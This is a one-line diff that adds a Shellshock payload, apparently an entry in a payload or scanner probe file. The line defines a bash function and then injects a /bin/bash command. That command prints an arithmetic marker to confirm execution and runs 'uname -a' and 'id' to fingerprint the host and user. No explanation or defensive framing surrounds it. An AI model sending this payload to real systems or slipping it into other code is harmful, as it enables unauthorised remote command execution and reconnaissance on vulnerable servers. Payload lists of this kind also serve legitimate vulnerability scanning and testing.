@@ -1,0 +1,1 @@
+() { foo;};echo; /bin/bash -c "expr 299663299665 / 3; echo 333:; uname -a; echo 333:; id;"
